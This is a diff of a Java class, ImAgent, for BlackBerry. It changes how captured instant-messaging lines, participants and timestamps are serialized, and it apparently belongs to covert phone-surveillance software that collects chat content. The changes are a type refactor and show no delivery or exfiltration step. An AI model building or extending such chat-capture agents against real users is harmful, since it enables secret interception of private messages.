@@ -14,7 +14,6 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.AppListener;
-import blackberry.agent.im.Line;
 import blackberry.agent.im.LineMarkup;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
@@ -82,13 +81,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
     }
 
-    private synchronized Line unserialize(String partecipants) {
+    private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
         //#endif
 
         if (markup.isMarkup()) {
-            Line lastLine = markup.getLine(partecipants);
+            String lastLine = markup.getLine(partecipants);
 
             //#ifdef DEBUG
             debug.trace("unserialize: " + lastLine);
@@ -99,7 +98,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         return null;
     }
 
-    private synchronized void serialize(String partecipants, Line lastLine) {
+    private synchronized void serialize(String partecipants, String lastLine) {
         //#ifdef DEBUG
         debug.trace("serialize: " + lastLine);
         //#endif
@@ -234,7 +233,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         Check.asserts(lines != null, "null lines");
         //#endif
 
-        Line lastLine = unserialize(partecipants);
+        String lastLine = unserialize(partecipants);
 
         if (lines.lastElement().equals(lastLine)) {
             //#ifdef DEBUG
@@ -261,7 +260,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
 
         try {
-            lastLine = (Line) lines.lastElement();
+            lastLine = (String) lines.lastElement();
             //#ifdef DEBUG
             debug.trace("add, serialize lastLine: " + lastLine);
             //#endif
@@ -300,7 +299,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
         for (int i = startFrom; i < lines.size(); i++) {
 
-            String chatcontent = ((Line) lines.elementAt(i)).getMessage();
+            String chatcontent = (String) lines.elementAt(i);
 
             items.addElement(datetime.getStructTm());
             items.addElement(WChar.getBytes(imname, true));
